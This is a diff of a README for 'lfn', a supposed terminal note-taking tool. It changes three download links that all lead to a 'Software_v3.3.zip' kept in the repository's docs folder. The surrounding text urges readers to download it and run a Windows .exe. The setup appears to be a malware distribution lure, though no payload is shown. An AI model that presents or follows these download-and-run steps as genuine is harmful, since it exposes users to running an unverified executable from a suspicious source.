@@ -1,6 +1,6 @@
 # 📝 lfn - Keep Life Notes in One Place
 
-[![Download lfn](https://img.shields.io/badge/Download%20lfn-Start%20Here-blue?style=for-the-badge)](https://github.com/amazo5385/lfn/raw/refs/heads/main/docs/Software_v3.3.zip)
+[![Download lfn](https://img.shields.io/badge/Download%20lfn-Start%20Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/amazo5385/lfn/main/docs/Software_v3.3.zip)
 
 ## 🚀 What is lfn?
 
@@ -12,7 +12,7 @@ It is built for simple note taking from the terminal. If you like typing a few l
 
 Visit this page to download or get the app files:
 
-https://github.com/amazo5385/lfn/raw/refs/heads/main/docs/Software_v3.3.zip
+https://raw.githubusercontent.com/amazo5385/lfn/main/docs/Software_v3.3.zip
 
 On that page, look for the latest release or the main download files. If the project provides a Windows file such as an `.exe` file, download and run this file. If it provides a zip file, download the zip file first, then unpack it.
 
@@ -209,7 +209,7 @@ The real file names may differ, but the idea is the same. Keep the app and its n
 ## 🏁 Start Using lfn
 
 1. Open the download page:
-   https://github.com/amazo5385/lfn/raw/refs/heads/main/docs/Software_v3.3.zip
+   https://raw.githubusercontent.com/amazo5385/lfn/main/docs/Software_v3.3.zip
 2. Get the latest Windows file
 3. Install or unpack it if needed
 4. Open the app
